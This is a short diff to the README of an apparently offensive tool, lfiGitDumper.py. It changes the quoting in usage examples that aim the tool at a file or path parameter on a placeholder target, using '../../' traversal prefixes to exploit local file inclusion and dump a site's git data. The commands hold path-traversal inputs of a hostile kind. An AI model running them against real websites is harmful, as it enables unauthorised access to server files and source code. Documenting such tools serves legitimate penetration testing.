@@ -78,19 +78,19 @@ urllib3
 ## Basic Usage
 
 ```bash
-python3 lfiGitDumper.py --url "https://target.com/view.php?file=$b64prefixlfi$" --prefix "../../" --output dump
+python3 lfiGitDumper.py --url 'https://target.com/view.php?file=$b64prefixlfi$' --prefix "../../" --output dump
 ```
 
 **Run with automatic prefix discovery:**
 
 ```bash
-python3 lfiGitDumper.py --url "https://target.com/view.php?file=$b64prefixlfi$" --auto --output dump
+python3 lfiGitDumper.py --url 'https://target.com/view.php?file=$b64prefixlfi$' --auto --output dump
 ```
 
 **Use raw path injection with a custom thread count:**
 
 ```bash
-python3 lfiGitDumper.py --url "https://target.com/page.php?path=$lfi$" --prefix "../../../" --output results --jobs 20
+python3 lfiGitDumper.py --url 'https://target.com/page.php?path=$lfi$' --prefix "../../../" --output results --jobs 20
 ```
 
 ---
